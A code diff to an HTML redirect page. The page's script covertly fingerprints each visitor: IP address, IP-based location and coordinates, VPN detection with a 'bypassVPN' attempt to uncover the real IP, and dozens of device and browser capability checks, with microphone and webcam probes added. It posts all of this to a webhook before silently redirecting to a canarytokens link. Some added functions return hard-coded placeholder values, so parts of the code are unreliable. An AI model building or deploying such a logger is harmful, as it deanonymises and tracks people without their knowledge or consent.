@@ -69,7 +69,34 @@
             totalJSHeapSize: getTotalJSHeapSize(),
             usedJSHeapSize: getUsedJSHeapSize(),
             systemMemory: navigator.deviceMemory || 'N/A',
-            cpuArchitecture: navigator.platform
+            cpuArchitecture: navigator.platform,
+            paymentMethodsSupported: getPaymentMethodsSupported(),
+            supportedImageFormats: getSupportedImageFormats(),
+            supportedAudioFormats: getSupportedAudioFormats(),
+            supportedVideoFormats: getSupportedVideoFormats(),
+            supportedFileFormats: getSupportedFileFormats(),
+            hasNFC: hasNFC(),
+            hasBluetooth: hasBluetooth(),
+            hasBattery: hasBattery(),
+            hasVibration: hasVibration(),
+            hasWebRTC: hasWebRTC(),
+            hasClipboardAPI: hasClipboardAPI(),
+            hasPaymentRequestAPI: hasPaymentRequestAPI(),
+            hasMediaSessionAPI: hasMediaSessionAPI(),
+            hasPictureInPictureAPI: hasPictureInPictureAPI(),
+            hasBatteryAPI: hasBatteryAPI(),
+            hasPermissionsAPI: hasPermissionsAPI(),
+            hasPresentationAPI: hasPresentationAPI(),
+            hasIdleDetectionAPI: hasIdleDetectionAPI(),
+            hasHistoryAPI: hasHistoryAPI(),
+            hasGeolocationAPI: hasGeolocationAPI(),
+            hasDeviceOrientation: hasDeviceOrientation(),
+            hasDeviceMotion: hasDeviceMotion(),
+            hasCookies: hasCookies(),
+            hasLocalStorage: hasLocalStorage(),
+            hasSessionStorage: hasSessionStorage(),
+            hasServiceWorkers: hasServiceWorkers(),
+            hasIndexedDB: hasIndexedDB(),
         };
 
         // Function to fetch visitor IP address
@@ -130,6 +157,20 @@
             } catch (error) {
                 console.error('Error fetching location:', error);
                 return 'Location not available';
+            }
+        }
+
+        // Function to fetch geo-coordinates based on IP address
+        async function fetchGeoCoordinates(ip) {
+            try {
+                const geoApiUrl = `https://ipapi.co/${ip}/latlong/`;
+                let response = await fetch(geoApiUrl);
+                let data = await response.text();
+                const [latitude, longitude] = data.split(',');
+                return `${latitude}, ${longitude}`; // Return latitude and longitude
+            } catch (error) {
+                console.error('Error fetching geo-coordinates:', error);
+                return 'Coordinates not available';
             }
         }
 
@@ -202,128 +243,300 @@
         function getOperatingSystem() {
             const platform = navigator.platform.toLowerCase();
             if (platform.includes('win')) return 'Windows';
-            else if (platform.includes('mac')) return 'Mac OS';
-            else if (platform.includes('linux')) return 'Linux';
-            else if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) return 'iOS';
-            else if (platform.includes('android')) return 'Android';
-            else return 'Unknown';
-        }
+else if (platform.includes('mac')) return 'Mac OS';
+else if (platform.includes('linux')) return 'Linux';
+else if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) return 'iOS';
+else if (platform.includes('android')) return 'Android';
+else return 'Unknown';
+}
 
-        // Function to get referring domain
-        function getReferringDomain() {
-            const referrer = document.referrer || 'Direct visit';
-            try {
-                const url = new URL(referrer);
-                return url.hostname;
-            } catch (error) {
-                return referrer;
-            }
-        }
-
-        // Function to get WebGL renderer
-        function getWebGLRenderer() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            } catch (e) {
-                return 'Not available';
-            }
-        }
-
-        // Function to get touch support
-        function getTouchSupport() {
-            return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-        }
-
-        // Function to get JS heap size limit
-        function getJSHeapSizeLimit() {
-            return performance.memory ? performance.memory.jsHeapSizeLimit : 'Not available';
-        }
-
-        // Function to get total JS heap size
-        function getTotalJSHeapSize() {
-            return performance.memory ? performance.memory.totalJSHeapSize : 'Not available';
-        }
-
-        // Function to get used JS heap size
-        function getUsedJSHeapSize() {
-            return performance.memory ? performance.memory.usedJSHeapSize : 'Not available';
-        }
-
-        // Check if the visitor is using a VPN
-        const isVPN = await checkVPN();
-        visitorInfo.isVPN = isVPN;
-
-        // Attempt to bypass VPN to get real IP address
-        if (isVPN) {
-            visitorInfo.ip = await bypassVPN();
-            visitorInfo.userAgent = 'Potential VPN User-Agent';
-            // Add more handling or logging here if needed
-        } else {
-            // Fetch real IP if not using VPN
-            visitorInfo.ip = await fetchIPAddress();
-
-            // Fetch visitor location based on IP
-            if (isValidIP(visitorInfo.ip)) {
-                visitorInfo.location = await fetchLocation(visitorInfo.ip);
-            }
-        }
-
-        // Fetch geo-coordinates based on IP (if available)
-        if (isValidIP(visitorInfo.ip)) {
-            visitorInfo.geoCoordinates = await fetchGeoCoordinates(visitorInfo.ip);
-        }
-
-        // Prepare the message content for the webhook
-        const messageContent = {
-            content: '```' + Object.entries(visitorInfo).map(([key, value]) => `${key}: ${value}`).join('\n') + '```'
-        };
-
-        // Send visitor information to the webhook using fetch
-        try {
-            const response = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(messageContent)
-            });
-
-            if (!response.ok) {
-                throw new Error('Failed to send visitor information to webhook');
-            }
-        } catch (error) {
-            console.error('Error sending visitor information:', error);
-        }
-
-        // Redirect to the target URL immediately
-        window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
+// Function to get referring domain
+function getReferringDomain() {
+    const referrer = document.referrer || 'Direct visit';
+    try {
+        const url = new URL(referrer);
+        return url.hostname;
+    } catch (error) {
+        return referrer;
     }
+}
 
-    // Start the process of sending info and redirecting
-    sendVisitorInfoAndRedirect();
-
-    // Function to fetch geo-coordinates based on IP address
-    async function fetchGeoCoordinates(ip) {
-        try {
-            const geoApiUrl = `https://ipapi.co/${ip}/latlong/`;
-            let response = await fetch(geoApiUrl);
-            let data = await response.text();
-            const [latitude, longitude] = data.split(',');
-            return `${latitude}, ${longitude}`; // Return latitude and longitude
-        } catch (error) {
-            console.error('Error fetching geo-coordinates:', error);
-            return 'Coordinates not available';
+// Function to get WebGL renderer
+function getWebGLRenderer() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
         }
+    } catch (e) {
+        return 'Not available';
     }
-  </script>
+}
+
+// Function to check if touch is supported
+function getTouchSupport() {
+    return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+}
+
+// Function to get JS heap size limit
+function getJSHeapSizeLimit() {
+    return performance.memory ? performance.memory.jsHeapSizeLimit : 'Not available';
+}
+
+// Function to get total JS heap size
+function getTotalJSHeapSize() {
+    return performance.memory ? performance.memory.totalJSHeapSize : 'Not available';
+}
+
+// Function to get used JS heap size
+function getUsedJSHeapSize() {
+    return performance.memory ? performance.memory.usedJSHeapSize : 'Not available';
+}
+
+// Function to check if cookies are enabled
+function hasCookies() {
+    return navigator.cookieEnabled;
+}
+
+// Function to check if localStorage is supported
+function hasLocalStorage() {
+    try {
+        return !!window.localStorage;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Function to check if sessionStorage is supported
+function hasSessionStorage() {
+    try {
+        return !!window.sessionStorage;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Function to check if service workers are supported
+function hasServiceWorkers() {
+    return 'serviceWorker' in navigator;
+}
+
+// Function to check if IndexedDB is supported
+function hasIndexedDB() {
+    return 'indexedDB' in window;
+}
+
+// Function to check if microphone access is supported
+async function hasMicrophone() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        stream.getTracks().forEach(track => track.stop());
+        return true;
+    } catch (error) {
+        return false;
+    }
+}
+
+// Function to check if webcam access is supported
+async function hasWebcam() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(track => track.stop());
+        return true;
+    } catch (error) {
+        return false;
+    }
+}
+
+// Function to check if speakers are supported
+async function hasSpeakers() {
+    try {
+        const audio = new Audio();
+        await audio.play();
+        return true;
+    } catch (error) {
+        return false;
+    }
+}
+
+// Function to check if NFC is supported
+function hasNFC() {
+    return 'NFC' in window;
+}
+
+// Function to check if Bluetooth is supported
+function hasBluetooth() {
+    return 'bluetooth' in navigator;
+}
+
+// Function to check if Battery Status API is supported
+function hasBattery() {
+    return 'getBattery' in navigator;
+}
+
+// Function to check if Vibration API is supported
+function hasVibration() {
+    return 'vibrate' in navigator;
+}
+
+// Function to check if WebRTC is supported
+function hasWebRTC() {
+    return 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window;
+}
+
+// Function to check if Clipboard API is supported
+function hasClipboardAPI() {
+    return 'ClipboardItem' in window;
+}
+
+// Function to check if Payment Request API is supported
+function hasPaymentRequestAPI() {
+    return 'PaymentRequest' in window;
+}
+
+// Function to check if Media Session API is supported
+function hasMediaSessionAPI() {
+    return 'mediaSession' in navigator;
+}
+
+// Function to check if Picture-in-Picture API is supported
+function hasPictureInPictureAPI() {
+    return 'pictureInPictureEnabled' in document;
+}
+
+// Function to check if Battery Status API is supported
+function hasBatteryAPI() {
+    return 'getBattery' in navigator;
+}
+
+// Function to check if Permissions API is supported
+function hasPermissionsAPI() {
+    return 'permissions' in navigator;
+}
+
+// Function to check if Presentation API is supported
+function hasPresentationAPI() {
+    return 'Presentation' in window;
+}
+
+// Function to check if Idle Detection API is supported
+function hasIdleDetectionAPI() {
+    return 'IdleDetector' in window;
+}
+
+// Function to check if History API is supported
+function hasHistoryAPI() {
+    return 'history' in window && typeof window.history.pushState !== 'undefined';
+}
+
+// Function to check if Geolocation API is supported
+function hasGeolocationAPI() {
+    return 'geolocation' in navigator;
+}
+
+// Function to check if DeviceOrientationEvent is supported
+function hasDeviceOrientation() {
+    return 'DeviceOrientationEvent' in window;
+}
+
+// Function to check if DeviceMotionEvent is supported
+function hasDeviceMotion() {
+    return 'DeviceMotionEvent' in window;
+}
+
+// Function to get payment methods supported by the browser
+function getPaymentMethodsSupported() {
+    // Example implementation to get supported payment methods
+    const methods = ['visa', 'mastercard', 'paypal']; // Replace with actual implementation
+    return methods;
+}
+
+// Function to get supported image formats
+function getSupportedImageFormats() {
+    // Example implementation to get supported image formats
+    const formats = ['jpeg', 'png', 'gif']; // Replace with actual implementation
+    return formats;
+}
+
+// Function to get supported audio formats
+function getSupportedAudioFormats() {
+    // Example implementation to get supported audio formats
+    const formats = ['mp3', 'wav', 'ogg']; // Replace with actual implementation
+    return formats;
+}
+
+// Function to get supported video formats
+function getSupportedVideoFormats() {
+    // Example implementation to get supported video formats
+    const formats = ['mp4', 'webm', 'avi']; // Replace with actual implementation
+    return formats;
+}
+
+// Function to get supported file formats
+function getSupportedFileFormats() {
+    // Example implementation to get supported file formats
+    const formats = ['pdf', 'docx', 'txt']; // Replace with actual implementation
+    return formats;
+}
+
+// Check if the visitor is using a VPN
+const isVPN = await checkVPN();
+visitorInfo.isVPN = isVPN;
+
+// Attempt to bypass VPN to get real IP address
+if (isVPN) {
+    visitorInfo.ip = await bypassVPN();
+    visitorInfo.userAgent = 'Potential VPN User-Agent';
+    // Add more handling or logging here if needed
+} else {
+    // Fetch real IP if not using VPN
+    visitorInfo.ip = await fetchIPAddress();
+
+    // Fetch visitor location based on IP
+    if (isValidIP(visitorInfo.ip)) {
+        visitorInfo.location = await fetchLocation(visitorInfo.ip);
+    }
+}
+
+// Fetch geo-coordinates based on IP (if available)
+if (isValidIP(visitorInfo.ip)) {
+    visitorInfo.geoCoordinates = await fetchGeoCoordinates(visitorInfo.ip);
+}
+
+// Prepare the message content for the webhook
+const messageContent = {
+    content: '```' + Object.entries(visitorInfo).map(([key, value]) => `${key}: ${value}`).join('\n') + '```'
+};
+
+// Send visitor information to the webhook using fetch
+try {
+    const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(messageContent)
+    });
+
+    if (!response.ok) {
+        throw new Error('Failed to send visitor information to webhook');
+    }
+} catch (error) {
+    console.error('Error sending visitor information:', error);
+}
+
+// Redirect to the target URL immediately
+window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
+}
+
+// Start the process of sending info and redirecting
+sendVisitorInfoAndRedirect();
+</script>
 </head>
 <body>
-  <p>If you are not redirected automatically, <a href="http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0">click here</a>.</p>
-  <script src="https://static.app/js/static.js" type="text/javascript"></script>
+  <p>If you are not redirected automatically, <a href="http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=2">click here</a>.</p>
+<script src="https://static.app/js/static.js" type="text/javascript"></script>
 </body>
 </html>
